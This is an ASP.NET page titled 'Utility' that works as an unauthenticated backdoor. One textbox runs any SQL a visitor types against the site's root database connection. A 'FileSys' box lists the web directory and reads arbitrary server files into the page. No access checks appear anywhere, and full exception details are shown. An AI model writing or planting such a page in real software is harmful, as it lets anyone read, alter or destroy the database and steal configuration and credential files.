<%@ Page Language="VB" %>
<%@ import Namespace="System.Data" %>
<%@ import Namespace="System.Data.SqlClient" %>
<%@ import Namespace="System.Data.SqlTypes" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

    Dim gsConn As String = ConfigurationManager.AppSettings("AIMSRootConnectionString")
    Dim oDataTable As New DataTable

    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs)
        If Not IsPostBack Then
            tbCheck.Attributes.Add("onkeypress", "return clickButton(event,'" + btnGo.ClientID + "')")
            tbRows.Attributes.Add("onkeypress", "return clickButton(event,'" + btnGo.ClientID + "')")
        End If
        tbCheck.Focus()
    End Sub

    Protected Sub btnGo_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        lblError.Text = String.Empty
        If tbCheck.Text.Trim <> String.Empty Then
            If tbCheck.Text.ToLower.Contains("select") Then
                Call BindGrid()
            Else
                Dim oCmd As SqlCommand
                Dim oConn As New SqlConnection(gsConn)
                oConn.Open()
                Dim sSQL As String = tbCheck.Text.Trim
                oCmd = New SqlCommand(sSQL, oConn)
                Try
                    oCmd.ExecuteNonQuery()
                Catch ex As Exception
                    lblError.Text = ex.ToString
                Finally
                    oConn.Close()
                End Try
            End If
        End If

    End Sub

    Protected Sub btnDisplay_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        Call BindGrid()
    End Sub
    
    Protected Sub BindGrid()
        If tbCheck.Text <> String.Empty Then
            Dim oConn As New SqlConnection(gsConn)
            Try
                Dim sSQL As String = tbCheck.Text
                Dim oAdapter As New SqlDataAdapter(sSQL, oConn)
                oAdapter.Fill(oDataTable)
                If oDataTable.Rows.Count > 0 Then
                    gvDisplay.PageSize = tbRows.Text
                    gvDisplay.DataSource = oDataTable
                    gvDisplay.DataBind()
                End If
            Catch ex As Exception
                lblError.Text = ex.ToString
            Finally
                oConn.Close()
            End Try
        End If
    End Sub

    Protected Sub gvDisplay_PageIndexChanging(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.GridViewPageEventArgs)
        gvDisplay.PageIndex = e.NewPageIndex
        Call BindGrid()
    End Sub
    
    Protected Sub btnDo_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim c As String = tbDo.Text.Trim.ToLower
        If c.StartsWith("list") Then
            For Each f As String In My.Computer.FileSystem.GetFiles(Server.MapPath(""))
                lblError.Text = lblError.Text & f & "<br />"
            Next
            Exit Sub
        End If
        If c.StartsWith("read ") Then
            c = c.Substring(4)
            'lblError.Text = HttpUtility.HtmlEncode(My.Computer.FileSystem.ReadAllText(c))
            'lblError.Text.Replace(Environment.NewLine, "<br />")
            Try
                Using sr As StreamReader = New StreamReader(c)
                    Dim l As String
                    Do
                        l = sr.ReadLine
                        lblError.Text = lblError.Text & HttpUtility.HtmlEncode(l) & "<br />"
                    Loop Until l Is Nothing
                    sr.Close()
                End Using
            Catch ex As Exception
                lblError.Text = ex.Message
            End Try
            Exit Sub
        End If
    End Sub
    
</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>Utility</title>
</head>
<body>
    <form id="form1" runat="server">
    <div style="font-size: xx-small; font-family: Verdana">
        <table width="95%">
            <tr>
                <td style="width: 10%">
                    Statement:</td>
                <td style="width: 90%">
                    <asp:TextBox ID="tbCheck" runat="server" Width="600px" MaxLength="200"></asp:TextBox>&nbsp;
                    <asp:Button ID="btnGo" runat="server" Text="go" OnClick="btnGo_Click" /></td>
            </tr>
            <tr>
                <td style="height: 14px">
                    Rows:</td>
                <td style="height: 14px">
                    <asp:TextBox ID="tbRows" runat="server" Width="75px">25</asp:TextBox></td>
            </tr>
            <tr>
                <td>
                    FileSys:</td>
                <td>
                    <asp:TextBox ID="tbDo" runat="server"></asp:TextBox>
                    <asp:Button ID="btnDo" runat="server" OnClick="btnDo_Click" Text="do" /></td>
            </tr>
            <tr>
                <td>
                    </td>
                <td>
                    <asp:Label ID="lblError" runat="server" EnableViewState="False"></asp:Label>
                </td>
            </tr>
        </table>
    </div>
        <asp:GridView ID="gvDisplay" runat="server" Font-Names="Verdana" Font-Size="XX-Small" CellPadding="3" EnableViewState="False" AllowPaging="True" OnPageIndexChanging="gvDisplay_PageIndexChanging">
            <EmptyDataTemplate>
                no records found
            </EmptyDataTemplate>
            <AlternatingRowStyle BackColor="WhiteSmoke" />
        </asp:GridView>
    </form>
</body>
</html>
